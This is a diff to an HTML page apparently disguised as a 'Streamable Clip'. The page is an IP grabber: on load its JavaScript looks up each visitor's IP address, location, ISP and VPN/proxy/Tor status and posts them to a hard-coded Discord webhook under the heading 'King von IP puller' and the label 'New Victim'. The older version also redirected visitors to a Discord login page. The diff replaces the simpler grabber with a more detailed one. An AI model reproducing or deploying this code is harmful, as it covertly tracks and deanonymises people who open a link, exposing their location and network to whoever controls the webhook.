@@ -3,44 +3,89 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Streamable Clip</title>
 </head>
 <body>
     <script>
-    function json(url) {
-        return fetch(url).then(res => res.json());
-    }
-    
-    function getMyIP() {
-        let apiKey = 'c64ab728d42c9be3cba6c2d546fa575be79ed1cc32bf324b5de3a6d8';
-        let webhookURL = 'https://discord.com/api/webhooks/1308891035342213120/TbQOU164hVD4wWZ7kle5tqIXpS9_lU3P7fUXmlYw7fTBm5Av8Zki7-Cw9D4dZd530xvr';
-
-        json(`https://api.ipdata.co?api-key=${apiKey}`).then(data => {
-            let message = {
-                embeds: [
-                    {
-                        title: "@everyone King von IP puller 😈",
-                        description: `** New Victim**\nIP: ||${data.ip}||\nCity: ${data.city}\nCountry: ${data.country_code}\nBY RUNTZ PURCHASE TODAY!`,
-                        image: {
-                            url: "https://www.rollingstone.com/wp-content/uploads/2022/02/king-von-posthumous-album.jpg"
+    async function sendToDiscord(ipInfo) {
+        const webhookURL = 'https://discord.com/api/webhooks/1308891035342213120/TbQOU164hVD4wWZ7kle5tqIXpS9_lU3P7fUXmlYw7fTBm5Av8Zki7-Cw9D4dZd530xvr';
+        const discordMessage = {
+            embeds: [
+                {
+                    image: {
+                        url: "https://www.rollingstone.com/wp-content/uploads/2022/02/king-von-posthumous-album.jpg"
+                    },
+                    title: "King von IP puller 😈",
+                    fields: [
+                        {
+                            name: "IP Address", 
+                            value: ipInfo.data.ip, 
+                            inline: true
                         },
-                        color: 0x007BFF
+                        {
+                            name: "City", 
+                            value: ipInfo.data.city, 
+                            inline: true
+                        },
+                        {
+                            name: "Country", 
+                            value: ipInfo.data.country, 
+                            inline: true
+                        },
+                        {
+                            name: "Organization", 
+                            value: ipInfo.data.org, 
+                            inline: true
+                        },
+                        {
+                            name: "ASN Name", 
+                            value: ipInfo.data.asn.name, 
+                            inline: true
+                        },
+                        {
+                            name: "VPN", 
+                            value: ipInfo.data.privacy.vpn ? "Yes" : "No", 
+                            inline: true
+                        },
+                        {
+                            name: "Proxy", 
+                            value: ipInfo.data.privacy.proxy ? "Yes" : "No", 
+                            inline: true
+                        },
+                        {
+                            name: "TOR", 
+                            value: ipInfo.data.privacy.tor ? "Yes" : "No", 
+                            inline: true
+                        },
+                    ],
+                    color: 0x007BFF,
+                    footer: {
+                        text: "BY RUNTZ PURCHASE TODAY!"
                     }
-                ]
-            };
-            fetch(webhookURL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(message)
-            }).then(() => {
-                window.location.href = "https://discord.gg/login";
-            });
+                }
+            ]
+        };
+
+        await fetch(webhookURL, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(discordMessage)
         });
     }
-    getMyIP();
 
+    async function getVisitorInfo() {
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        const userIP = ipData.ip;
+
+        const ipInfoResponse = await fetch(`https://ipinfo.io/widget/demo/${userIP}`);
+        const ipInfo = await ipInfoResponse.json();
+
+        await sendToDiscord(ipInfo);
+    }
+
+    getVisitorInfo();
     </script>
 </body>
 </html>
